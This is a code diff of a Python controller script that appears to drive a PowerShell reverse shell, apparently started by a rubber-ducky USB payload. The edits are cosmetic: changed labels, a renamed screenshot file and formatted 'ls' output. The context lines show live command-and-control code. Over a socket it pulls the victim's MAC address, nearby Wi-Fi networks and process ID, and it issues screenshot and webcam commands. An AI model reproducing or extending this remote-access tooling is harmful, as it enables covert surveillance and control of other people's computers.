@@ -103,7 +103,7 @@ mac = conn.recv(1024).decode().split("\n")[0]
 print("MAC Address:           " + mac)
 conn.send("netsh wlan show network | findstr SSID | foreach-object{$_.split(\" \")[3]}\n".encode())
 network = conn.recv(1024).decode().split("\n")[0]
-print("Network:               " + network)
+print("Networks:              " + network)
 conn.send("$pid\n".encode())
 pid = conn.recv(1024).decode().split("\n")[0]
 print("Powershell PID:        " + pid)
@@ -214,7 +214,7 @@ while not stop:
             if "-m" in options or "-a" in options:
                 print("MAC Address:            " + mac)
             if "-n" in options or "-a" in options:
-                print("Network:                " + network)
+                print("Networks:               " + network)
             if "-pid" in options or "-a" in options:
                 print("Powershell PID:         " + pid)
             if "-e" in options or "-a" in options:
@@ -318,7 +318,7 @@ while not stop:
             stdin = "; ".join(commands)
         elif ducky_command[:10] == "screenshot":
             commands = []
-            commands.append("screenshot -screen -file \"$env:userprofile/z/image.png\" -imagetype png")
+            commands.append("screenshot -screen -file \"$env:userprofile/z/screenshot.png\" -imagetype png")
             stdin = "; ".join(commands)
         elif ducky_command[:11] == "webcam_list":
             commands = []
@@ -354,6 +354,8 @@ while not stop:
             stdin = ""
     elif stdin.startswith("k ") and stdin[2] != "\"":
         stdin = "k \"" + stdin[2:] + "\""
+    elif stdin == "ls" or stdin.startswith("ls "):
+        stdin = "(" + stdin + " | out-string).trim()"
     last = stdin
     conn.send((stdin + "\n").encode())
 s.close()
